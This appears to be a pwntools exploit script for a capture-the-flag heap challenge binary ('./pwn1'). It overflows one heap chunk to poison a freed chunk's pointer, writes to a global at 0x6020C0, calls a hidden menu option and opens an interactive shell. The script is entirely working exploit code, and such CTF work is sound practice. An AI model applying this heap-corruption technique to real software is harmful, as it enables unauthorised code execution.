from pwn import *
context.log_level="debug"
sh=process("./pwn1")
def cmd(c):
    sh.sendlineafter(b"Your choice :", str(c).encode())
def add(size,ctt):
    cmd(1)
    sh.sendlineafter(b"Size of Heap : ", str(size).encode())
    sh.sendafter(b"Content of heap:", ctt)
def edit(idx,size,ctt):
    cmd(2)
    sh.sendlineafter(b"Index :", str(idx).encode())
    sh.sendafter(b"Size of Heap : ", str(size).encode())
    sh.sendafter(b"Content of heap : ",ctt)
def dele(idx):
    cmd(3)
    sh.sendlineafter(b"Index :", str(idx).encode())
def backdoor():
    cmd(4869)
add(0x20,b'a') #0
add(0x20,b'a') #1
add(0x20,b'a') #2
dele(2)
dele(1)
edit(0,0x40,b'a'*0x20+p64(0)+p64(0x31)+p64(0x6020C0))
add(0x20,b'a')
add(0x20,b'\xff'*8)
backdoor()
# gdb.attach(sh)
sh.interactive()
